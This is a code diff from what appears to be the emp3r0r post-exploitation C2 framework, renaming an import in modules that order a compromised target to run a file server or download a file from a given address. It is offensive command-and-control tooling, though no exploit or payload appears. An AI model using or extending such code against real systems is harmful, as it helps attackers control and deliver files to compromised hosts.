@@ -6,7 +6,7 @@ package cc
 import (
 	"fmt"
 
-	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
+	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
 )
 
 func moduleFileServer() {
@@ -22,7 +22,7 @@ func moduleFileServer() {
 		CliPrintError("Option 'port' not found")
 		return
 	}
-	cmd := fmt.Sprintf("%s --port %s --switch %s", emp3r0r_data.C2CmdFileServer, portOpt.Val, server_switch)
+	cmd := fmt.Sprintf("%s --port %s --switch %s", emp3r0r_def.C2CmdFileServer, portOpt.Val, server_switch)
 	err := SendCmd(cmd, "", CurrentTarget)
 	if err != nil {
 		CliPrintError("SendCmd: %v", err)
@@ -44,7 +44,7 @@ func moduleDownloader() {
 	checksum := Options["checksum"].Val
 	path := Options["path"].Val
 
-	cmd := fmt.Sprintf("%s --download_addr %s --checksum %s --path %s", emp3r0r_data.C2CmdFileDownloader, download_addr, checksum, path)
+	cmd := fmt.Sprintf("%s --download_addr %s --checksum %s --path %s", emp3r0r_def.C2CmdFileDownloader, download_addr, checksum, path)
 	err = SendCmdToCurrentTarget(cmd, "")
 	if err != nil {
 		CliPrintError("SendCmd: %v", err)
